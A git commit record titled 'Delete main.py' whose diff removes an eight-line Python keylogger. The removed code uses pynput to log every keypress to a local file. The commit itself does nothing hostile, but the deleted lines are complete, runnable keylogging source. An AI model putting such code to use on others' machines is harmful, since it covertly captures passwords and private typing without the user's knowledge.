81f4e2a2faf34c668f82431ad16a5c64594701c7
3faze <93428357+3faze@users.noreply.github.com>
2022-10-01 19:13:41 +0100

    Delete main.py

--- main.py
+++
@@ -1,8 +0,0 @@
-from pynput.keyboard import Listener
-
-def press(key):
-    with open("log.txt", 'a') as f:
-        f.write(str(key))
-
-with Listener(on_press=press) as listener:
-    listener.join() 
